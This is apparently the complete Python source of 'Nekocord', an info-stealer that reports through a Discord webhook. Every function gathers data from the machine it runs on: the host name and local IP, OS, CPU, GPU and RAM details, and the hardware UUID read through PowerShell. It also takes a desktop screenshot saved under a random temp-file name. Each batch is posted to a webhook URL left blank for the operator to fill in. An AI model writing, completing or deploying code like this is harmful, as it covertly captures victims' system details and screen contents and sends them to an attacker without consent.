import requests
import socket
import time
import psutil
import string
import platform
import subprocess
import json
import base64
import random
import re
import wmi
import os
import pyautogui
import tempfile

host = socket.gethostname()
ip = socket.gethostbyname(host)

types = "@here"
h00k = ""

def iplogger():
    data = {
        "username": "Nekocord",
        "avatar_url": "https://cdn.discordapp.com/attachments/1357239283706105889/1360802327526903868/discord-avatar-512-1496X.png?ex=67fc716d&is=67fb1fed&hm=38cec1a577cde226e6fbe3bd45fabfcd3769493ee38f37365d4548c358be4847&", 
        "embeds": [{
            "title": "🏠️ IP INFO",
            "content": f"{types}",
            "fields": [
                {
                    "name": "💻️ Host Name",
                    "value": f"{host}",
                    "inline": True
                },
                {
                    "name": "👀 IP Address",
                    "value": f"||{ip}||",
                    "inline": True
                },
            ],
            "footer": {
                "text": "nekocord. | https://github.com/zakocord/Nekocord"
            }
        }]
    }
    response = requests.post(h00k, json=data)

def machineinfo():
    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()
    
    mem = psutil.virtual_memory()

    def get_machine_hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        uuid = subprocess.check_output(command, shell=True, text=True).strip()
        return uuid
    
    current_machine_id = get_machine_hwid()

    total_gb = round(mem.total / 1024**3)
    cpu_info = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    data2 = {
        "username": "Nekocord", 
        "avatar_url": "https://cdn.discordapp.com/attachments/1357239283706105889/1360802327526903868/discord-avatar-512-1496X.png?ex=67fc716d&is=67fb1fed&hm=38cec1a577cde226e6fbe3bd45fabfcd3769493ee38f37365d4548c358be4847&",  
        "embeds": [
            {
                "title": "💻️ Machine Info",
                "fields": [
                    {
                        "name": "💻️ PC",
                        "value": f"`{pc_name}`",
                        "inline": False
                    },
                    {
                        "name": "⌨️ OS:",
                        "value": f"`{os_name}`",
                        "inline": False
                    },
                    {
                        "name": "🥅 WI-FI",
                        "value": f"None",
                        "inline": False
                    },
                    {
                        "name": "📝 RAM",
                        "value": f"`{total_gb}GB`",
                        "inline": False
                    },
                    {
                        "name": "📺️ GPU",
                        "value": f"`{GPUm}`",
                        "inline": False
                    },
                    {
                        "name": "🖲️ CPU",
                        "value": f"`{cpu_info}`",
                        "inline": False
                    },
                    {
                        "name": "🔏 HWID",
                        "value": f"`{current_machine_id}`",
                        "inline": False
                    }                       
                ],
                "footer": {
                    "text": "nekocord. | https://github.com/zakocord/Nekocord"
                }   
            }
        ]
    } 

    response2 = requests.post(h00k, json=data2)

def gen_filename(length=10):
    safe_chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(safe_chars) for _ in range(length))

def screenshot():
    temp_dir = tempfile.gettempdir()
    screenshot_filename = gen_filename(16) + ".png" 
    screenshot_path = os.path.join(temp_dir, screenshot_filename)

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as f:
        files = {"file": (screenshot_filename, f, "image/png")}
        data = {"content": "📸 Screenshots"}
        response3 = requests.post(h00k, data=data, files=files)
    
    if response3.status_code == 204:
        pass
    else:
        pass

def main():
    machineinfo()
    iplogger()
    screenshot()
    

main()

